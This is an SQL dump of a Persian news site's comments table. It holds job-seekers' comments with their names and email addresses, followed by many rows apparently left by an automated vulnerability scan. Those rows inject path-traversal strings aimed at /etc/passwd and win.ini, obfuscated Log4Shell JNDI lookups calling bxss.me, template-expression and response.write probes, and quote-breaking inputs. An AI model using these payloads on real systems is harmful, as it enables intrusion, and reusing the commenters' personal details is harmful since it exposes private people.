INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87873, 51185, 'محمد زهیری اصل', 'mehdi64kingnaseri@gmail.com', 'استخدام', 0, '2024-07-11 06:09:06', '1403/4/21', '6:09:06 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87874, 51185, 'محمد زهیری اصل', 'mehdi64kingnaseri@gmail.com', 'استخدام', 0, '2024-07-11 06:09:07', '1403/4/21', '6:09:07 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87875, 51185, 'محمد زهیری اصل', 'mehdi64kingnaseri@gmail.com', 'استخدام', 0, '2024-07-11 06:09:07', '1403/4/21', '6:09:07 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87876, 51185, 'محمد زهیری اصل', 'mehdi64kingnaseri@gmail.com', 'استخدام', 0, '2024-07-11 06:09:20', '1403/4/21', '6:09:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87877, 60236, 'رضاامیری', 'Reza.amiri.m63@gmail.com', 'داری ۵ سال ثابقه کار در اداره برق دزفول را دارم باماشین استیجاری،داری دو قهرمانی کشور و چند دوره استانی در رشته تیراندازی دارای مدرک مربیگری تیراندازی ،داری ۱۱سال ثابقه بسیجی فعال در گردان عمار دزفول،و علاقه زیادی به حراست را دارم.', 0, '2024-07-12 17:29:16', '1403/4/22', '5:29:16 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87878, 60236, 'رضاامیری', 'Reza.amiri.m63@gmail.com', 'داری ۵ سال ثابقه کار در اداره برق دزفول را دارم باماشین استیجاری،داری دو قهرمانی کشور و چند دوره استانی در رشته تیراندازی دارای مدرک مربیگری تیراندازی ،داری ۱۱سال ثابقه بسیجی فعال در گردان عمار دزفول،و علاقه زیادی به حراست را دارم.', 0, '2024-07-12 17:29:38', '1403/4/22', '5:29:38 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87879, 60236, 'رضاامیری', 'Reza.amiri.m63@gmail.com', 'داری ۵ سال ثابقه کار در اداره برق دزفول را دارم باماشین استیجاری،داری دو قهرمانی کشور و چند دوره استانی در رشته تیراندازی دارای مدرک مربیگری تیراندازی ،داری ۱۱سال ثابقه بسیجی فعال در گردان عمار دزفول،و علاقه زیادی به حراست را دارم.', 0, '2024-07-12 17:30:51', '1403/4/22', '5:30:51 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87880, 60236, 'رضاامیری', 'Reza.amiri.m63@gmail.com', 'داری ۵ سال ثابقه کار در اداره برق دزفول را دارم باماشین استیجاری،داری دو قهرمانی کشور و چند دوره استانی در رشته تیراندازی دارای مدرک مربیگری تیراندازی ،داری ۱۱سال ثابقه بسیجی فعال در گردان عمار دزفول،و علاقه زیادی به حراست را دارم.', 0, '2024-07-12 17:31:24', '1403/4/22', '5:31:24 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87881, 51185, 'مجتبی فلاحی', 'fallahimojtaba4@gmail.com', 'سلام بنده ۲۰ ساله هستم دارای پایان خدمت و دیپلم  الکتروتکنیک  برق صنعتی هستم میخوام استخدام شم', 0, '2024-07-13 16:33:51', '1403/4/23', '4:33:51 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87882, 60236, 'محمدزرگان', 'mohammadzerkan@gmail.com', 'نگهبان', 0, '2024-07-16 00:41:51', '1403/4/26', '12:41:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87883, 60236, 'محمدزرگان', 'mohammadzerkan@gmail.com', 'نگهبان', 0, '2024-07-16 00:41:51', '1403/4/26', '12:41:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87884, 60237, 'عباس جاسم پور', 'ali.albosabih5879@gmail.cam', 'نگهبان', 0, '2024-07-16 11:14:45', '1403/4/26', '11:14:45 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87885, 60237, 'عباس جاسم پور', 'ali.albosabih5879@gmail.cam', 'نگهبان', 0, '2024-07-16 11:15:02', '1403/4/26', '11:15:02 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87886, 60236, 'محمدمهدی مرادی', 'Mehdimoradi3600@gmail.com', 'استخدام', 0, '2024-07-16 14:20:12', '1403/4/26', '2:20:12 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87887, 60236, 'محمدمهدی مرادی', 'Mehdimoradi3600@gmail.com', 'استخدام', 0, '2024-07-16 14:20:13', '1403/4/26', '2:20:13 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87888, 60236, 'محمدمهدی مرادی', 'Mehdimoradi3600@gmail.com', 'استخدام', 0, '2024-07-16 14:20:13', '1403/4/26', '2:20:13 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87890, 60237, 'سیداحمد فقیه', 'a.faghih777@gmail.com', 'کارت ورود به جلسه را ازکجا دریافت کنم!؟', 0, '2024-07-23 03:54:24', '1403/5/2', '3:54:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87891, 60236, 'اسماعیل زبیدی', 'www.zbydya77@gmail.com', 'چرا سن سیمبان کم زدین؟؟؟یعنی ما باسابقه باتجربه دیپلم داری کارت پایان خدمت حق نداریم تو این جامعه استخدام بشیم
من متولدسال۷۱هستم 
بیشتر از۱۰سال تو شبکه توزیع واحداث هستم
صفر تا۱۰۰شبکه کار کردم
انصافه سیستم راه نده بخاطر سن...
ما با پیمانکار هستیم تازه ۲۸ماه بیمه ردشده برامون چکار کنیم بنظرتون', 0, '2024-08-01 00:27:57', '1403/5/11', '12:27:57 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87892, 60236, 'اسماعیل زبیدی', 'www.zbydya77@gmail.com', 'چرا سن سیمبان کم زدین؟؟؟یعنی ما باسابقه باتجربه دیپلم داری کارت پایان خدمت حق نداریم تو این جامعه استخدام بشیم
من متولدسال۷۱هستم 
بیشتر از۱۰سال تو شبکه توزیع واحداث هستم
صفر تا۱۰۰شبکه کار کردم
انصافه سیستم راه نده بخاطر سن...
ما با پیمانکار هستیم تازه ۲۸ماه بیمه ردشده برامون چکار کنیم بنظرتون', 0, '2024-08-01 00:27:59', '1403/5/11', '12:27:59 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87893, 60236, 'اسماعیل زبیدی', 'www.zbydya77@gmail.com', 'چرا سن سیمبان کم زدین؟؟؟یعنی ما باسابقه باتجربه دیپلم داری کارت پایان خدمت حق نداریم تو این جامعه استخدام بشیم
من متولدسال۷۱هستم 
بیشتر از۱۰سال تو شبکه توزیع واحداث هستم
صفر تا۱۰۰شبکه کار کردم
انصافه سیستم راه نده بخاطر سن...
ما با پیمانکار هستیم تازه ۲۸ماه بیمه ردشده برامون چکار کنیم بنظرتون', 0, '2024-08-01 00:28:01', '1403/5/11', '12:28:01 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87894, 60236, 'اسماعیل زبیدی', 'www.zbydya77@gmail.com', 'چرا سن سیمبان کم زدین؟؟؟یعنی ما باسابقه باتجربه دیپلم داری کارت پایان خدمت حق نداریم تو این جامعه استخدام بشیم
من متولدسال۷۱هستم 
بیشتر از۱۰سال تو شبکه توزیع واحداث هستم
صفر تا۱۰۰شبکه کار کردم
انصافه سیستم راه نده بخاطر سن...
ما با پیمانکار هستیم تازه ۲۸ماه بیمه ردشده برامون چکار کنیم بنظرتون', 0, '2024-08-01 00:28:11', '1403/5/11', '12:28:11 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87895, 60236, 'اسماعیل زبیدی', 'www.zbydya77@gmail.com', 'چرا سن سیمبان کم زدین؟؟؟یعنی ما باسابقه باتجربه دیپلم داری کارت پایان خدمت حق نداریم تو این جامعه استخدام بشیم
من متولدسال۷۱هستم 
بیشتر از۱۰سال تو شبکه توزیع واحداث هستم
صفر تا۱۰۰شبکه کار کردم
انصافه سیستم راه نده بخاطر سن...
ما با پیمانکار هستیم تازه ۲۸ماه بیمه ردشده برامون چکار کنیم بنظرتون', 0, '2024-08-01 00:28:39', '1403/5/11', '12:28:39 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87896, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:30:45', '1403/5/11', '11:30:45 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87897, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:34:42', '1403/5/11', '11:34:42 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87898, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:34:51', '1403/5/11', '11:34:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87899, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:34:52', '1403/5/11', '11:34:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87900, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:34:53', '1403/5/11', '11:34:53 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87901, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:34:56', '1403/5/11', '11:34:56 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87902, 60238, 'pHqghUme', 'sample@email.tst', '/../../../../../../../../../../windows/system32/BITSADMIN.exe', 0, '2024-08-01 11:34:57', '1403/5/11', '11:34:57 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87903, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:05', '1403/5/11', '11:35:05 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87904, 60238, 'pHqghUme', '/../../../../../../../../../../windows/system32/BI', '1', 0, '2024-08-01 11:35:07', '1403/5/11', '11:35:07 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87905, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:11', '1403/5/11', '11:35:11 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87906, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:12', '1403/5/11', '11:35:12 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87907, 60238, '/../../../../../../../../../../windows/system32/BITSADMIN.exe', 'sample@email.tst', '1', 0, '2024-08-01 11:35:16', '1403/5/11', '11:35:16 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87908, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:20', '1403/5/11', '11:35:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87909, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:21', '1403/5/11', '11:35:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87910, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:21', '1403/5/11', '11:35:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87911, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:22', '1403/5/11', '11:35:22 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87912, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:25', '1403/5/11', '11:35:25 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87913, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:28', '1403/5/11', '11:35:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87914, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:28', '1403/5/11', '11:35:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87915, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:28', '1403/5/11', '11:35:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87916, 60238, 'OHZ6OE9FZTU=', 'sample@email.tst', '1', 0, '2024-08-01 11:35:29', '1403/5/11', '11:35:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87917, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:29', '1403/5/11', '11:35:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87918, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:30', '1403/5/11', '11:35:30 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87920, 60238, 'pHqghUme', 'sample@email.tst', '${9999029+9999881}', 0, '2024-08-01 11:35:31', '1403/5/11', '11:35:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87921, 60238, 'pHqghUme', 'sample@email.tst', '${j${::-n}di:dns${::-:}//hituxolbyesqx65f21${::-.}bxss.me}zzzz', 0, '2024-08-01 11:35:33', '1403/5/11', '11:35:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87922, 60238, 'pHqghUme', '${10000139+9999092}', '1', 0, '2024-08-01 11:35:33', '1403/5/11', '11:35:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87923, 60238, '${9999721+9999835}', 'sample@email.tst', '1', 0, '2024-08-01 11:35:36', '1403/5/11', '11:35:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87924, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:41', '1403/5/11', '11:35:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87926, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:41', '1403/5/11', '11:35:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87928, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:43', '1403/5/11', '11:35:43 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87929, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:44', '1403/5/11', '11:35:44 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87930, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:46', '1403/5/11', '11:35:46 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87931, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:35:47', '1403/5/11', '11:35:47 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87932, 60238, 'pHqghUme', 'sample@email.tst', '../../../../../../../../../../../../../../etc/passwd', 0, '2024-08-01 11:35:50', '1403/5/11', '11:35:50 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87933, 60238, 'pHqghUme', 'sample@email.tst', '

�💡\'\'"><&;|${${lower:j}${::-n}d${upper:ı}:dns${::-:}//hitopdcjgbcem12371${::-.}bxss.me}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 0, '2024-08-01 11:35:50', '1403/5/11', '11:35:50 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87934, 60238, 'pHqghUme', 'response.write(9039723*9080575', '1', 0, '2024-08-01 11:35:57', '1403/5/11', '11:35:57 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87935, 60238, 'pHqghUme', 'sample@email.tst', '1b5HeqNEO', 0, '2024-08-01 11:36:00', '1403/5/11', '11:36:00 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87936, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:05', '1403/5/11', '11:36:05 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87937, 60238, 'pHqghUme', 'sample@email.tst', '../../../../../../../../../../../../../../windows/win.ini', 0, '2024-08-01 11:36:07', '1403/5/11', '11:36:07 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87938, 60238, 'pHqghUme', '+response.write(9039723*9080575', '1', 0, '2024-08-01 11:36:08', '1403/5/11', '11:36:08 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87939, 60238, 'pHqghUme', '1psXfdqaO', '1', 0, '2024-08-01 11:36:09', '1403/5/11', '11:36:09 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87940, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:09', '1403/5/11', '11:36:09 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87941, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:10', '1403/5/11', '11:36:10 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87942, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:11', '1403/5/11', '11:36:11 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87943, 60238, 'pHqghUme', '+response.write(9039723*9080575', '1', 0, '2024-08-01 11:36:14', '1403/5/11', '11:36:14 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87944, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:15', '1403/5/11', '11:36:15 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87945, 60238, 'pHqghUme', 'sample@email.tst', '../1', 0, '2024-08-01 11:36:17', '1403/5/11', '11:36:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87946, 60238, 'pHqghUme', 'sample@email.tst', '${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j.074625.5598-1764.5598.af3ca${::-.}1${::-.}bxss.me}}', 0, '2024-08-01 11:36:18', '1403/5/11', '11:36:18 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87948, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:20', '1403/5/11', '11:36:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87950, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:21', '1403/5/11', '11:36:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87951, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:24', '1403/5/11', '11:36:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87952, 60238, '1KXeS2eNO', 'sample@email.tst', '1', 0, '2024-08-01 11:36:35', '1403/5/11', '11:36:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87953, 60238, 'pHqghUme', '../../../../../../../../../../../../../../etc/pass', '1', 0, '2024-08-01 11:36:35', '1403/5/11', '11:36:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87954, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:36', '1403/5/11', '11:36:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87955, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:37', '1403/5/11', '11:36:37 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87956, 60238, 'pHqghUme', '${j${::-n}di:dns${::-:}//hitbicbusmmce9b945${::-.}', '1', 0, '2024-08-01 11:36:38', '1403/5/11', '11:36:38 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87958, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:39', '1403/5/11', '11:36:39 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87959, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:42', '1403/5/11', '11:36:42 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87960, 60238, 'pHqghUme', '', '1', 0, '2024-08-01 11:36:43', '1403/5/11', '11:36:43 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87961, 60238, 'pHqghUme', '../../../../../../../../../../../../../../windows/', '1', 0, '2024-08-01 11:36:43', '1403/5/11', '11:36:43 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87962, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:43', '1403/5/11', '11:36:43 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87963, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:43', '1403/5/11', '11:36:43 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87964, 60238, 'pHqghUme', '�💡\'\'"><&;|${${lower:j}${::-n}d${upper:ı}:dns${::-:', '1', 0, '2024-08-01 11:36:44', '1403/5/11', '11:36:44 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87966, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:49', '1403/5/11', '11:36:49 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87967, 60238, 'pHqghUme', '', '1', 0, '2024-08-01 11:36:49', '1403/5/11', '11:36:49 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87969, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:49', '1403/5/11', '11:36:49 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87970, 60238, 'pHqghUme', '12345\'\'"\\'\'\', '1', 0, '2024-08-01 11:36:50', '1403/5/11', '11:36:50 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87971, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:50', '1403/5/11', '11:36:50 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87973, 60238, 'pHqghUme', '', '1', 0, '2024-08-01 11:36:51', '1403/5/11', '11:36:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87974, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:51', '1403/5/11', '11:36:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87975, 60238, 'pHqghUme', '(', '1', 0, '2024-08-01 11:36:52', '1403/5/11', '11:36:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87976, 60238, 'pHqghUme', '${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::', '1', 0, '2024-08-01 11:36:52', '1403/5/11', '11:36:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87977, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:52', '1403/5/11', '11:36:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87979, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:55', '1403/5/11', '11:36:55 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87980, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:55', '1403/5/11', '11:36:55 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87981, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:57', '1403/5/11', '11:36:57 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87982, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:57', '1403/5/11', '11:36:57 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87983, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:36:59', '1403/5/11', '11:36:59 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87984, 60238, '${j${::-n}di:dns${::-:}//hitjqtvoppplu4ba7d${::-.}bxss.me}zzzz', 'sample@email.tst', '1', 0, '2024-08-01 11:37:00', '1403/5/11', '11:37:00 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87986, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:00', '1403/5/11', '11:37:00 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87989, 60238, '', 'sample@email.tst', '1', 0, '2024-08-01 11:37:03', '1403/5/11', '11:37:03 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87990, 60238, '', 'sample@email.tst', '1', 0, '2024-08-01 11:37:03', '1403/5/11', '11:37:03 AM');
